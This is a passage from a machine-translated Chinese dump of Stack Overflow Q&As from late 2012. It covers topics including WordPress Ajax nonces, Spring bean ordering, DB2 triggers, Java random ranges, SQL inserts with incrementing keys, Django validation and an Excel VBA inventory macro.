A `class`，在一个非常简单的层面上，通常代表一种现实世界的对象。类的实例是一个`object`，您可以指向、引用、对其进行操作、创建、销毁或其他方式的东西。在这种情况下，一个类将是 a`Game`或者更具体地说是 a `Puzzle`。拼图/游戏有规则，有玩家，有分数，有时间限制，以及你可以代表游戏的任何其他内容。这些东西中的每一个都是您要创建的潜在类/对象。

在您的代码中，您使用多维数组来表示您的游戏板。也许您想将此对象转换为一个类？这有什么好处？它的目的是将您直接在板上执行的操作与其余代码分开。

例如，您有方法`existsInColumn`、`existsInRow`和`existsInSubGrid`。这些方法是*直接*在游戏网格上操作的东西，应该与游戏执行逻辑的实际实现分开。这种对类的分离有助于简化代码，以提高其可维护性、可读性、可扩展性和许多其他*能力*。没有什么说你写的代码功能不一样，但是请任何程序员拿起你的代码，看看他们可以改变/改进什么，他们会转身说“我不会经历这一切！”

回到正题……一旦你有了属于的类`GameGrid`或类似的东西，`SudokuPuzzle`你就可以开始在拼图中使用网格中的逻辑来制作方法来解决问题。您的游戏的一部分将涉及以一种或另一种形式获取用户输入并将其传递到网格。也许`grid.insertNumber(int x, int y, int number)`拼图只需要一个电话。然后，该方法可以调用上述存在的函数来确定他们的猜测是对还是错。

现在，显然还有很多可以说的。你需要先坐下来决定如何*设计*你的游戏。会有`Player`对象吗？`Score`? 它是使用调用来构建网格的命令行游戏`System.out.print()`还是使用像 Swing 这样的库的图形游戏？一旦做出这些决定，您就可以放下一些代码，然后返回需要解决的更具体的问题。

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:01:26.613

您可以让一个类持有一个执行命令，该命令执行该命令应该执行的操作，但您不能直接将方法转换为类。希望这可以帮助 ：）

# php - 安全性 - Ajax 和 Nonce 使用

> ID：13845774
> 
> 赞同：2
> 
> 时间：2012-12-12T17:56:36.123
> 
> 标签：php, wordpress, security, jquery

我正在开发一个站点，该站点将一些从 jquery 到 PHP 的 ajax 调用发布到 PHP，并将数据从 PhP 返回到 jquery。

一切正常，但我想知道我处理电话的方法是否可以，就安全性而言，以及我是否可以采取或记住任何进一步的安全措施。

贯穿我的流程；

**函数.php 文件**

1.  设置 wp_localize_script() 并将 ajax url 和 nonce 的变量传递给它 -

    ```
     wp_localize_script( 'main', 'WP', array( 
         'AJAX_URL' => admin_url( 'admin-ajax.php'), 
         'NONCE' => wp_create_nonce( 'ajax_custom_nonce' ) 
     )); 
    ```

**myscript.js 文件**

1.  在我的 js 文件中，我使用 jquery 发送了我的发布请求；

    ```
    $.ajax({
        type : "post",
        url: WP.AJAX_URL,
        data: ({action : 'request_handler', 
            id : 'content_id',   
            nonce : WP.NONCE }),
        success: function(data) {}
    }) 
    ```

**ajax.php 文件**

1.  ajax.php 文件接收ajax post，调用request_handler()；

    ```
    add_action("wp_ajax_nopriv_request_handler", "request_handler");
    add_action("wp_ajax_request_handler", "request_handler"); 
    ```

2.  request_handler() 检查 nonce，获取 post id 并运行 switch 语句来调用所需的函数。

    ```
     function request_handler() { 
         // check the nonce
         $nonce = $_POST['nonce'];

         if ( ! wp_verify_nonce( $nonce, 'ajax_custom_nonce' ) ) 
             die ('busted');

        $id = $_POST['id']; 

        switch ($id) {
            case 'vimeo_embed':
                require_once(TEMPLATEPATH . '/library/vimeo.php'); 
                load_vimeo();  
            break; 
            case 'popup':  
                require_once(TEMPLATEPATH . '/library/popup.php'); 
                load_popup();
            break;

            ....etc
        }
     } 
    ```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T18:00:51.503

代码看起来不错，我想唯一需要注意的是您如何处理 $id 的意外值，我猜默认值在该开关中可以正常工作。

# java - Spring bean 实例化排序

> ID：13845775
> 
> 赞同：7
> 
> 时间：2012-12-12T17:56:37.617
> 
> 标签：java, spring, jakarta-ee, applicationcontext

我遇到了一个 Bean 实例化排序很重要的问题。当前，下面的 Bean3 正在运行基于数据库的缓存放置操作，而 Bean 1 使用代理 Bean2 对新创建的缓存进行查询。优先级是 Bean3 和 Bean 2 在 Bean1 被实例化之前完全实例化，即当 Spring 容器启动时。这些 bean 位于单独的 JARS 中，并且 Bean2 对 Bean1 的引用未使用 Autowired。相反，服务定位器正在给它一个参考。我们使用 Spring 2.5.2 而不是使用 XML 来实例化 bean。任何帮助表示赞赏！

*   JAR1（春季项目）

    ```
    @Service ("bean3")   
     public class Bean3 implements ApplicationListener  { 
        public void onApplicationEvent() {  
          //load data from DB and populate cache                    
        }
         public void getCache(){
         //get data from cache
        } 
    ```

    }

    ```
    @Service ("bean2")
    public class Bean2 { 
    @Autowired 
    private Bean3 bean3;
       private void methodA(){
         bean3.getCache();
       }
    } 
    ```

*   JAR2（非 Spring 项目）

    ```
    public class Bean1{  
    Bean2 bean2 = SpringServiceLocator.getBean("bean2")
      public void methodB(){
        bean2.methodA();
       } 
    } 
    ```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-23T16:28:46.393

如果我理解正确，您正在尝试在应用程序启动（上下文初始化）时执行一些逻辑。

如果是这种情况，我建议您使用 BeanPostProcessor，在应用程序启动时执行任何特殊操作。

```
public class MyBeanPostProcessor implements BeanPostProcessor {

    @Override
    public Object postProcessBeforeInitialization(Object bean, String beanName)
            throws BeansException {

        .. **perform special things**
        return bean;
    }

    @Override
    public Object postProcessAfterInitialization(Object bean, String beanName)
            throws BeansException {
        ..**perform special things**
        return bean;
    }
} 
```

不要忘记告诉 Spring 你的后处理器

```
<context:component-scan base-package="some.package" />
<bean class="some.package.MyBeanPostProcessor" 
```

有关更多信息，请在此处阅读[http://static.springsource.org/spring/docs/3.0.0.M3/reference/html/ch04s07.html](http://static.springsource.org/spring/docs/3.0.0.M3/reference/html/ch04s07.html)

我希望这有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-14T02:46:33.277

也许您的自制 Spring Service 定位器需要如下信号

```
 Lock l = new ReentrantLock();
        Condition springready = l.newCondition();

        l.lock();
        try {
          while (READY_FLAG)
              springready.await();

            ...

        } finally {
          l.unlock();
        } 
```

此外

您可以收听 ContextRefreshedEvent 以更改 READY_FLAG 并发出“springready”信号

# sql - DB2 等效于 SQL Server 的 TRIGGER_NESTLEVEL()？

> ID：13845776
> 
> 赞同：4
> 
> 时间：2012-12-12T17:56:38.893
> 
> 标签：sql, sql-server, triggers, db2

我试图控制 DB2 (v9.7) 上的递归触发器，不幸的是，IBM 文档没有提到知道当前触发器调用处于哪个递归级别的方法。

我发现 sql-server: 上有这个函数[`trigger_nestlevel()`](http://msdn.microsoft.com/en-us/library/ms182737.aspx)，它基本上可以满足我的要求（知道实际的触发器递归调用级别）。所以我想知道DB2中是否有等效的功能。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-21T22:09:54.737

不幸的是，DB2 没有为此提供任何函数或存储过程。您最多可以有 16 个触发级联级别。

它是硬编码的，无法更改。

顺便说一句，在 DB2 中，如果一个触发器导致另一个触发器被触发，则称为触发器级联。您可以通过 NO CASCADE 关键字避免级联。

如果你想避免调用同一个触发器，有一个解决方法：

1.  为您的表创建一个视图 => Create View vTable1 as Select * from Table1
2.  为 vTable1 创建一个 INSTEAD OF TRIGGER。=> 创建触发器 TRG_INSERT 而不是在 vTable1 上插入
3.  在 TRG_INSERT 中，插入到 table1。

# c# - C#动态绑定和void方法调用

> ID：13845779
> 
> 赞同：1
> 
> 时间：2012-12-12T17:56:52.390
> 
> 标签：c#, dynamic, dynamic-binding

为什么编译器让这个表达式编译而运行时异常是不可避免的？

我不认为`Dynamic Binding`应该适用于 void 方法

```
static void Main(string[] args)
{
    var res = Test((dynamic)"test");  // throws RuntimeBinderException exception at runtime
}

static void Test(dynamic args)
{
} 
```

如果 C# 规范将上述表达式称为动态绑定表达式，为什么以下方法不能编译？

```
static dynamic DynamicMethod()
{
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T18:27:53.623

Test((dynamic)"abc") 作为动态语句被整体评估。更完整地说，您可以：

```
public static string Test(string s) { return s; } 
```

这将是一个更好的重载，因此将优先选择和执行其他方法。

或者换句话说：如果不将方法组解析为特定签名，它就无法知道返回是否无效。并且**根据定义**，重载决议被推迟到动态调用的运行时。

它可以做更多的分析吗？大概。但是规范并不要求它，所以它最多可能是一个警告（而不是错误）。

# php - 奇怪的错误日志结果

> ID：13845781
> 
> 赞同：1
> 
> 时间：2012-12-12T17:57:09.803
> 
> 标签：php, mysql, logging, error-log

我的错误日志中不断出现错误，如下所示：

```
[12-Dec-2012 10:19:11] PHP Warning:  mysql_real_escape_string() [<a href='function.mysql-real-escape-string'>function.mysql-real-escape-string</a>]: Access denied for user 'jcummings'@'localhost' (using password: NO) in ...<rest of the code here has been obfuscated>... 
```

我想知道的是“jcummings”（在这种情况下）或那里显示的任何用户名。我出现了几个不同的用户名，但它从来没有与我的网站相关联的任何用户名，也不是任何数据库中的任何变量或我网站上的任何东西，真的。仅当我在站点上遇到错误时才会发生这种情况，并且它会根据站点（我正在测试不同站点的子文件夹）给我不同的名称，并且在不同的时间给我不同的名称。

这是我应该关注的事情，还是这只是 php 服务器抛出一个临时名称？

编辑：我的代码看起来像这样：

```
$var = $_GET['var'];
$var = stripslashes($var);
$var = mysql_real_escape_string($var;

//connect
mysql_connect("$host", "$username", "$password") or die ("Could not connect");
mysql_select_db("$dbName") or die ("Could not select DB");  

//query
$sql = "SELECT * FROM $dbTable WHERE tarVar = '$var'";
$result = mysql_query($sql); 
```

因此，在建立连接之前，我实际上并没有调用它；该网站现在运行良好，我复制的错误来自当天早些时候。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-12T18:03:37.837

我很确定您是`mysql_real_escape_string()`在与 MySQL 服务器建立开放连接之前调用的。虽然不需要作为参数，但`mysql_real_escape_string()`需要 MySQL 连接。

从文档：

> **可选参数“link_identifier”：**
> MySQL 连接。如果未指定链接标识符，则假定由 mysql_connect() 打开的最后一个链接。如果没有找到这样的链接，它将尝试创建一个，就好像 mysql_connect() 没有参数被调用一样。如果未找到或建立连接，则会生成 E_WARNING 级别错误。

检查日志条目中“in ...”之后的文件。这些文件是您的应用程序的一部分吗？他们被修改了吗？或者它们是由攻击者上传的？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:01:56.070

这意味着您需要通过连接到MySQL数据库`mysql_connect()`才能使用此功能。您的凭据`mysql_connect()`可能不正确。

# installation - 从虚拟环境运行 ipython 时，在“ImportError: No module named Shell”之后酸化删除了“/usr/bin/ipython”

> ID：13845782
> 
> 赞同：0
> 
> 时间：2012-12-12T17:57:16.707
> 
> 标签：installation, ipython

**前言**

我在系统范围内安装了运行良好的 Ipython。但是，当我在虚拟环境中工作并且必须在那里安装 ipython 时，从那里运行它会出现以下错误：

```
File "/usr/bin/ipython", line 26, in <module>
    import IPython.Shell
ImportError: No module named Shell 
```

**当前问题**

不幸的是，我不小心删除`ipython`了`/usr/bin`. `ipython`因此，从虚拟环境内部或外部调用现在会出现此错误：

```
bash: /usr/bin/ipython: No such file or directory 
```

以下与 ipython 相关的文件当前位于`/usr/bin`：

```
/usr/bin$ find ipython*
ipython2.6
ipython2.7
ipython-wx
ipythonx 
```

如果我删除所有这些文件，新的系统范围的 ipython 安装会重新安装这些文件吗？（我有疑问，因为我重新安装它并没有添加已删除的`ipython`文件。在`/usr/bin`）

我应该怎么做才能解决这个问题？

**额外信息**

我正在使用python2.7

**编辑**

当我按照 Monir 的建议替换新`/usr/bin/ipython`文件的第一行时，出现此错误：`#!/usr/bin/python`

```
Traceback (most recent call last):
  File "/usr/bin/ipython", line 5, in <module>
    from pkg_resources import load_entry_point
  File "/usr/lib/python2.7/dist-packages/pkg_resources.py", line 2676, in <module>
    parse_requirements(__requires__), Environment()
  File "/usr/lib/python2.7/dist-packages/pkg_resources.py", line 552, in resolve
    raise DistributionNotFound(req)
pkg_resources.DistributionNotFound: ipython==0.13.1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T00:26:29.443

-- 作为答案关闭这个 qn--

尝试在虚拟环境中搜索 ipython 可执行文件并将其复制到 /usr/bin。如果系统范围的 ipython 版本与虚拟环境中安装的相同，这应该可以工作。

根据要求，我正在粘贴我的 /us/bin/ipython：

```
#!/usr/bin/python
# EASY-INSTALL-ENTRY-SCRIPT: 'ipython==0.13.1','console_scripts','ipython'
__requires__ = 'ipython==0.13.1'
import sys
from pkg_resources import load_entry_point

sys.exit(
   load_entry_point('ipython==0.13.1', 'console_scripts', 'ipython')()
) 
```

这指向系统 python，因此可以访问必要的系统范围的包而不是虚拟环境 python。在您的 virtualenv 之外的目录上运行“which python”，并将该路径放在 sha-bang 之后的第一行。（很可能是 /usr/bin/pyhton）

--更新：粘贴最近评论的一部分以使该答案被接受并关闭 qn。

如果一切都失败了，请尝试在系统级别重新安装 ipython。不确定您是否已经尝试过。

# java - 使用 return 时 Math.random() 无法正常工作

> ID：13845784
> 
> 赞同：-3
> 
> 时间：2012-12-12T17:57:33.717
> 
> 标签：java, math, random

我有一个程序，我希望一个对象返回两个数字之间的值。但问题是，大多数时候，我得到的数字不在边界之内。这是代码：

```
public int getSize() {
  int s = (int)Math.random() * (max - min) + min;
  return s;
} 
```

min 和 max 在代码中都定义为 320 和 640，但有时我得到的值低于我需要的值（例如我曾经得到 283），有时甚至更高。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T18:00:16.603

我不明白你怎么可能得到`283`if `min`/ `max`are `320`/ `640`。

也就是说，您的代码中有一个错误会使其始终返回`min`。要修复它，请使用以下命令：

```
int s = (int)(Math.random() * (max - min) + min); 
```

注意添加的括号。没有它们，您将结果转换为`Math.random()`to `int`。这总是给出零，使整个表达式计算为`min`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T18:22:19.340

如果您可以访问 C#，您可以尝试以下操作吗？这在功能上等同于您的任务，并且不应生成 320 和 640 范围之外的数字。如果是这样，您可以将 Java 代码的逻辑与它进行比较，以查看您在哪里犯了错误。

```
namespace TestRand
{
    class TestRand
    {
        private static Random r;

        private const int min = 320;
        private const int max = 640;

        public static void Main()
        {
            r = new Random();
            for (int i = 0; i < 1000; i++)
            {
                Console.WriteLine("{0} - {1}", i, getSize());
            }
        }

        public static int getSize()
        {  
            int s = (int)(r.NextDouble() * (max - min)) + min;
            return s;
        }
    } 
} 
```

# wcf - 将 SOAP 消息（服务器创建的响应）记录到服务器端的数据库中

> ID：13845785
> 
> 赞同：0
> 
> 时间：2012-12-12T17:57:38.430
> 
> 标签：wcf, soap

我想记录 Web 服务生成的传出 (SOAP) 消息，以响应客户端（在服务器端）发送的请求。

使用服务模型客户端能够通过将设置应用到 Web 应用程序的 web.config 中来将响应记录到数据库中，例如

```
< system.servicemodel >

    < extensions>

       < behaviors>

    < bindings> ... 
```

请指导我如何在服务器端实现日志记录和配置。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:18:51.337

您可以启用诊断跟踪：

只需要在 web.config 中添加一个部分 -

```
 <system.diagnostics>
    <sources>
      <source name="System.ServiceModel"
              switchValue="Information, ActivityTracing"
              propagateActivity="true">
        <listeners>
          <add name="traceListener"
              type="System.Diagnostics.XmlWriterTraceListener"
              initializeData= "F:\Sony\Traces.svclog" />
        </listeners>
      </source>
    </sources>
  </system.diagnostics> 
```

[http://sonyarouje.com/2011/11/10/diagnostic-trace-svclog-configuration-for-wcf/](http://sonyarouje.com/2011/11/10/diagnostic-trace-svclog-configuration-for-wcf/)

[http://msdn.microsoft.com/en-us/library/ms732023.aspx](http://msdn.microsoft.com/en-us/library/ms732023.aspx)

还要检查这个相关问题[如何打开 WCF 跟踪？](https://stackoverflow.com/questions/4271517/how-to-turn-on-wcf-tracing)

查看传递的实际 SOAP 信封 [http://litemedia.info/debug-soap-request-and-response-in-wcf](http://litemedia.info/debug-soap-request-and-response-in-wcf)

还发现了另一个类似的问题[如何启用 WCF 日志记录以便它写入数据库？](https://stackoverflow.com/questions/1923934/how-can-i-enable-wcf-logging-so-that-it-writes-to-a-database)

# c# - 使用 RelativeTimeConverter 并随着时间的推移更新 Textblock 的文本

> ID：13845787
> 
> 赞同：0
> 
> 时间：2012-12-12T17:57:46.647
> 
> 标签：c#, windows-phone-7, xaml, converter, silverlight-toolkit

在我的 MainPage.xaml 中，我有一个 ListBox，其数据模板如下所示：

```
<DataTemplate>
<TextBlock Name="DateTextBlock"  Text="{Binding Modified,  Converter={StaticResource RelativeTimeConverter}}"/>           
</DataTemplate> 
```

当应用程序启动时，转换完成一次，然后直到我重新启动应用程序，文本块的文本保持不变，即使我导航到另一个页面并返回 MainPage.xaml 。

我想要的只是不断地使用转换器，而不仅仅是在 Modified 属性更改时使用一次，以显示时间在流逝，因为用户正在使用我的应用程序。这怎么可能实现？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T12:19:10.747

你使用[INotifyPropertyChanged](http://msdn.microsoft.com/en-us/library/system.componentmodel.inotifypropertychanged%28v=vs.95%29.aspx)吗？请参阅[这篇文章](http://blogs.msdn.com/b/amit_chatterjee/archive/2011/04/16/building-a-windows-phone-7-application-data-binding-and-persistence.aspx)，非常清楚地解释数据绑定。

**编辑**：根据您使用 INotifyPropertyChanged 的​​评论中的新信息，但搜索通知 UI 属性的解决方案已定期更改。所以考虑使用某种计时器，例如[DispatcherTimer](http://msdn.microsoft.com/ru-ru/library/system.windows.threading.dispatchertimer%28v=vs.95%29.aspx)：

```
DispatcherTimer timer = new DispatcherTimer();
timer.Interval = TimeSpan.FromSeconds(4);
timer.Tick += delegate(object s, EventArgs args)
{
    foreach (YourItem item in ViewModel.Items)
    {
        item.NotifyPropertyChanged("Modified");
    };
}
timer.Start(); 
```

另外（当然）将此方法添加到 YourItem 类：

```
public void NotifyPropertyChanged(string propertyName)  
{
    OnPropertyChanged(propertyName); 
} 
```

# sql - 使用增量主键 sql 插入多行

> ID：13845791
> 
> 赞同：4
> 
> 时间：2012-12-12T17:57:54.740
> 
> 标签：sql, sql-server-2008, insert, primary-key

```
INSERT INTO TABLE1 (COLUMN1, PRIMARY_KEY)
   SELECT 
      COLUMN1,
      (SELECT COALESCE(MAX(PRIMARY_KEY), 0) 
        FROM TABLE1) + 1 
   FROM 
      TABLE2 
```

错误：

> *违反主键约束。无法在对象中插入重复键。*

如何在第一行之后使主键递增？

我希望能够同时将项目列表添加到此表中，而不是插入 RBAR。

谢谢您的帮助

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-12T18:51:18.547

```
INSERT INTO TABLE1 (COLUMN1, PRIMARY_KEY)
SELECT COLUMN1,
       (SELECT COALESCE(MAX(PRIMARY_KEY),0)
       FROM TABLE1) + row_number() over (order by 1/0)
FROM TABLE 2 
```

仅对于这条语句，ID 将是连续的，例如，如果`Max(Primary Key)`是 99 并且它正在插入 4 条记录，它们将是 100、101、102、103。如果多个进程同时插入，则很容易违反约束，但是这并不是说它比使用单一记录更糟糕，`MAX()`因为它本质上是不安全的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T18:54:35.153

你可以试试这个：

```
DECLARE @CurrentPK INT
SELECT @CurrentPK(MAX(PRIMARY_KEY)

SELECT column1, ROW_NUMBER() OVER (ORDER BY column1) AS 'RowNumber'
INTO #temp
FROM Table2

INSERT INTO TABLE1
(COLUMN1, PRIMARY_KEY)
SELECT COLUMN1,@CurrentPK+RowNumber 
FROM #temp 
```

当然，为了防止竞争条件，你应该把它放在一个事务中，并明确锁定同时发生的其他插入。您最好的选择是带有 try6 catch 块以及事务处理的存储过程。

我想让你明白，在这种情况下，避免交易不是一种选择。如果您不专门使用事务，则有时两个 tprocesses 会尝试使用相同的 id 号。事实上，这就是为什么不推荐使用获取最后一个 ID 号的方法的原因，因为使用它很容易造成数据库问题。我知道您对此感到困惑，但至少要学会在未来永远不要使用这种短视的反模式。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-12T18:05:46.113

您不必检查最大键并将 1 递增 1。将其设为一`IDENTITY(1,1) NOT NULL`列，服务器将处理它。然后使用；

```
INSERT INTO TABLE1 (COLUMN1)
SELECT COLUMN1
FROM TABLE 2 
```

# logging - 使用“文本文件的 ssis 日志提供程序”启用日志记录的 SSIS 包写入数千个空字符

> ID：13845792
> 
> 赞同：0
> 
> 时间：2012-12-12T17:58:03.120
> 
> 标签：logging, ssis, text-files

我有一个设置了写入文本文件的日志记录的 SSIS 包。这很好用，除了每次运行包时它都会将成千上万个 NUL 字符记录到文件中。

知道为什么会发生这种情况以及可以采取哪些措施来防止这种情况发生？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T00:25:28.207

这听起来像是未正确设置的 SSIS 日志记录任务中的一项或多项设置。

在 SSIS > Logging 下，您可能在选择的容器包下有一个返回 NULL 的任务。选中包装下的所有框。然后选择详细信息选项卡并验证是否选择了所有正确的事件。其中之一也可能在每次发生时返回 null 。

我建议取消选中某些选项并运行包以查看这是否会更改您的日志结果。我还应用了文本日志文件，过去也遇到过类似的问题，这些问题都通过这种方法解决了。

# django - Django自定义验证多个字段

> ID：13845795
> 
> 赞同：6
> 
> 时间：2012-12-12T17:58:13.283
> 
> 标签：django, django-forms

我想在自定义清理方法中验证多个字段。

到目前为止我有这个：

```
class ProjectInfoForm(forms.Form):
    module = forms.ModelChoiceField(
        queryset=Module.objects.all(),
    )
    piece = forms.CharField(
        widget=forms.Select(),
        required=False,
    )
    span = forms.IntegerField(
        max_value=100,
        initial=48
    )
    max_span = forms.IntegerField(
        max_value=100,
        initial=0
    )

    def clean(self):
        span = self.cleaned_data['span']
        max_span = self.cleaned_data['max_span']
        piece = self.cleaned_data.['piece']

        # validate piece 
        try:
            Piece.objects.get(pk=m)
        except Piece.DoesNotExist:
            raise forms.ValidationError(
                'Illegal Piece selected!'
            )
            self._errors["piece"] = "Please enter a valid model"

        # validate spans
        if span > max_span:
            raise forms.ValidationError(
                'Span must be less than or equal to Maximum Span'
            )
            self._errors["span"] = "Please enter a valid span"
        return self.cleaned_data 
```

但是，如果两个子句都无效，这只会给我一条消息。如何获取所有无效消息。此外，我没有收到特定于字段的消息 - 如何包含要为特定字段显示的消息？

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T18:05:33.213

存储错误并且在方法结束之前不要引发它们：

```
def clean(self):
    span = self.cleaned_data['span']
    max_span = self.cleaned_data['max_span']
    piece = self.cleaned_data.['piece']
    error_messages = []

    # validate piece 
    try:
        Piece.objects.get(pk=m)
    except Piece.DoesNotExist:
        error_messages.append('Illegal Piece selected')
        self._errors["piece"] = "Please enter a valid model"

    # validate spans
    if span > max_span:
        error_messages.append('Span must be less than or equal to Maximum Span')
        self._errors["span"] = "Please enter a valid span"

    if len(error_messages):
        raise forms.ValidationError(' & '.join(error_messages))

    return self.cleaned_data 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:01:02.100

在这种情况下，您应该编写自定义[clean_FIELDNAME](https://docs.djangoproject.com/en/dev/ref/forms/validation/#cleaning-a-specific-field-attribute)方法。这样，以后在模板中使用 {{form.errors}} 时，可以显示以字段为中心的验证错误。*clean*方法用于验证跨越多个字段的逻辑。看看我在上面发布的链接，你需要知道的关于验证 django 表单的一切都在那里。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T18:07:27.447

发生这种情况是因为您正在使用`raise`. 尝试用代码中的这两行替换它：

```
del self.cleaned_data['piece'] 
```

和

```
del self.cleaned_data['span'] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-08-14T19:24:09.303

看来这在 Django 的更高版本中发生了变化（这似乎在 2.1 及更高版本中工作）：

```
 from django import forms

class ContactForm(forms.Form):
    # Everything as before.
    ...

    def clean(self):
        cleaned_data = super().clean()
        cc_myself = cleaned_data.get("cc_myself")
        subject = cleaned_data.get("subject")

        if cc_myself and subject and "help" not in subject:
            msg = "Must put 'help' in subject when cc'ing yourself."
            self.add_error('cc_myself', msg)
            self.add_error('subject', msg) 
```

[https://docs.djangoproject.com/en/dev/ref/forms/validation/#raising-multiple-errors](https://docs.djangoproject.com/en/dev/ref/forms/validation/#raising-multiple-errors)有更多细节。

# vba - （VBA）根据活动工作表中的匹配单元格值在多个单独的工作表中查找和复制行的一部分

> ID：13845796
> 
> 赞同：2
> 
> 时间：2012-12-12T17:58:13.433
> 
> 标签：vba, search, automation, copy, relationship

我希望标题不要太混乱！

基本上，我有自己的 Excel 清单。我有一个工作表作为我的菜单，我为每个客户（例如，TD Bank、Rogers、Standard Life）都有一个工作表，其内容是这样的（在这种情况下，我的客户是 Videotron）：

```
 A           B          C                 D      E            F        G         H
1   CLIENT      UNIQUEID   MATERIALTYPE      SIZE   MATERIALCODE LOCATION QTYPERBOX TOTALQTY
2   Videotron   VID-001    Outgoing Envelope 9x12   VID-OE0812   4-1-3    500       15000
3   Videotron   VID-002    Letterhead        8.5x14 VID-LH0812   1-1-1    2500      50000
4   Videotron   VID-003    Reply Envelope    #9     VID-RE0812   8-5-2    1000      7500 
```

我需要帮助的工作表是我的“位置”表，其中包含我仓库中所有物理位置的列表，如下所示：

```
 A          B        C          D              E      F              G           H
     LOCATION   CLIENT   UNIQUEID   MATERIALTYPE   SIZE   MATERIALCODE   QTYPERBOX   TOTALQTY 
1    1-1-1    
2    1-1-2
3    1-1-3
4    1-2-1
5    1-2-2
6    1-2-3
     etc. etc. 
```

对于每个位置，其中一个客户工作表中都会有一个条目，可以在任何地方。如果我们根据显示的工作表以物理位置“1-1-1”为例，我在那里有一个包含 50,000 个 Videotron 信头的托盘。我需要代码做的是在所有客户端工作表中搜索“1-1-1”，一旦找到将信息复制到第 1 行上方的 B:H 列。然后我需要对 location 进行相同的处理第 2 行中的 1-1-2' 依此类推，直到我的最后一个位置，为了争论，是 '8-8-3'。

目标是让“位置”工作表使用从客户工作表中获取的正确信息填充自身，这反过来将始终真实反映当前的实物库存。这意味着如果我从位置“1-1-1”中删除 10,000 个信封，它将在“位置”工作表中自动更新。类似的情况是，如果我在仓库中实际交换了 2 个托盘，假设我将位置“1-1-1”的托盘与“2-3-1”的托盘交换，并在我的客户工作表中进行了更改。 .. 我需要“位置”工作表来反映更改。

我查看了很多代码，其中很多我认为可以帮助我，但它只与我想要实现的部分有关，而且我没有足够的知识或理解将它们拼凑在一起我的工作簿。

有没有人认为有可能让它发挥作用，或者我只是在做梦？

编辑：应该说我在 Excel 2003 中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-04T13:10:18.560

根据我的评论，我仍然认为它需要成为一个数据库，但我意识到业务限制可能会使您偏离最有效的方式，因为这是现实。

太棒了 也许你可以尝试类似...

```
Sub sortInventory()
Dim wsInv As Worksheet
Dim wsCust As Worksheet

Dim rngSearch As Range
Dim cellSearch As Range
Dim rngLoc As Range
Dim rngCurLoc As Range

Dim findVal As String

Dim locCol As Integer, custCol As Integer

Dim locFound As Boolean

Set wsInv = ActiveWorkbook.Sheets("Locations")
Set rngLoc = wsInv.Range("A1", wsInv.Range("A1").End(xlDown))

For Each rngCurLoc In rngLoc.Cells
'This is what you're looking for in each sheet.
    findVal = rngCurLoc.Value
    locFound = False
    For Each wsCust In ActiveWorkbook.Sheets
        If locFound Then Exit For

       'Exclude the location sheet
        If wsCust.Name = "Locations" Then
         Next wsCust
        End If

        Set rngSearch = wsCust.Range("F1", Range("F1").End(xlDown))

        For Each cellSearch In rngSearch.Cells
        'Look for your value
            If cellSearch.Value = findVal Then ''Alternate method could use the "find"
            'Transfer to Locations
            'Use an offset loop to pick/place map to new location.

                 For custCol = 1 To 8 '8 can modify to the width of your data (I think it's 8)
                Select Case custCol
                    Case Is <= 5 'The first 5 are offset by one to the location sheet.
                        wsInv.Cells(rngCurLoc.Row, custCol + 1).Value = wsCust.Cells(cellSearch.Row, custCol).Value
                    Case 6 'Location column
                        ''Do nothing.
                    Case Else 'Direct map
                        wsInv.Cells(rngCurLoc.Row, custCol).Value = wsCust.Cells(cellSearch.Row, custCol).Value
                End Select
            Next custCol
            locFound = True 'This will kick the 2nd loop out to the range loop.
            Exit For
        End If
    Next wsCust
Next rngCurLoc

End Sub 
```

我无法真正对其进行测试，当我将它粘贴到此处的代码块中时，选项卡变得有点有趣，因此控制循环不会超级排列。无论如何，它应该让你开始。它的对象和集合很重，但 VBA 代码可能会变得非常脆弱，而无需明确定义您要做什么。

# mobile - BX 滑块和滚动页面

> ID：13845799
> 
> 赞同：2
> 
> 时间：2012-12-12T17:58:21.767
> 
> 标签：mobile, touch, swipe, direction, bxslider

我将 bxslider 用于移动网站，水平滚动图像。问题是如果您触摸 bxslider，页面不会滚动。如何捕捉手指方向并向下滚动页面？谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-11T07:27:12.060

您可以将选项 touchEnabled 设置为 false。

# actionscript-3 - 可以将同名的两个参数传递给一个服务吗？

> ID：13845801
> 
> 赞同：1
> 
> 时间：2012-12-12T17:58:27.533
> 
> 标签：actionscript-3, apache-flex, air, flash-builder

我正在从 Flash Builder 应用程序向服务器传递参数。我想同时搜索“老师”和“房间”。我可以通过 HTML 页面执行此操作，如下所示：

```
<input type="checkbox" name="searchFor" value="teachers" />teachers 
<input type="checkbox" name="searchFor" value="rooms" />rooms 
```

所以有两个输入，都命名为 searchFor。提交后，请求如下所示：

```
searchFor: teachers
searchFor: rooms 
```

换句话说，传递了两个参数。

我正在尝试使用名为 param 的对象在 Flash Builder 中做同样的事情：

```
param.query = pQuery;
param.searchFor = "teachers";
param.searchFor = "rooms";
searchUsersService(param); 
```

